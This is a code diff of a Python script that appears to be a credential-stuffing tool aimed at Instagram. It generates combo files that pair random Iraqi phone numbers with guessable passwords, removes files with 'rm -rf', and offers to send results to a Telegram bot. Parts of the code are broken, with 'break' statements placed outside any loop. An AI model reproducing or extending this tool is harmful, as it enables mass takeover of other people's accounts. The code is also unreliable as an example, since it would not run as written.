@@ -48,6 +48,7 @@ def ins():
 			print("+964750"+str(rrrrrr)+":1122334455")
 			sys.stdout.flush()
 		pass
+	iiiii=input(" halbzhera: ")
 	if iiiii=="1":
 		i()
 		instagram1()
@@ -205,64 +206,6 @@ def instagram1():
 	from user_agent import generate_user_agent
 	from datetime import datetime
 	r = requests.session()
-	iiiii=input(" halbzhera: ")
-	def i():
-		combo=input(" [PATH] File >>> ")
-		break
-	def ii():
-		os.system("rm -rf combo.txt")
-		for lowdl in range(5000):
-			r=random.randint(1000000, 9999999)
-			rr=random.randint(1000000, 9999999)
-			sys.stdout=open("combo.txt", "a")
-			print("+964770"+str(r)+":"+str(r))
-			print("+964750"+str(rr)+":"+str(rr))
-			sys.stdout.flush()
-		break
-	def iii():
-		os.system("rm -rf combo.txt")
-		for loldl in range(5000):
-			r=random.randint(1000000, 9999999)
-			rr=random.randint(1000000, 9999999)
-			sys.stdout=open("combo.txt", "a")
-			print("+964770"+str(r)+":0770"+str(r))
-			print("+964750"+str(rr)+":0750"+str(rr))
-			sys.stdout.flush()
-		break
-	def iiii():
-		os.system("rm -rf combo.txt")
-		for lossll in range(1000):
-			r=random.randint(1000000, 9999999)
-			rr=random.randint(1000000, 9999999)
-			rrr=random.randint(1000000, 9999999)
-			rrrr=random.randint(1000000, 9999999)
-			rrrrr=random.randint(1000000, 9999999)
-			rrrrrr=random.randint(1000000, 9999999)
-			sys.stdout=open("combo.txt", "a")
-			print("+964770"+str(r)+":"+str(r))
-			print("+964750"+str(rr)+":"+str(rr))
-			print("+964770"+str(rrr)+":0770"+str(rrr))
-			print("+964750"+str(rrrr)+":1234512345")
-			print("+964750"+str(rrrrr)+":123456123456")
-			print("+964750"+str(rrrrrr)+":1122334455")
-			sys.stdout.flush()
-		break
-	if iiiii=="1":
-		i()
-		pass
-	elif iiiii=="2":
-		ii()
-		pass
-	elif iiiii=="3":
-		iii()
-		pass
-	elif iiiii=="4":
-		iiii()
-		pass
-	elif iiiii=="0":
-		os.sys.exit()
-	else:
-		instagram1()
 	import os, sys
 	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
 	agar=input(wd+"   You Want To Bot TELEGRAM Your Results (y,yes or n,no)")
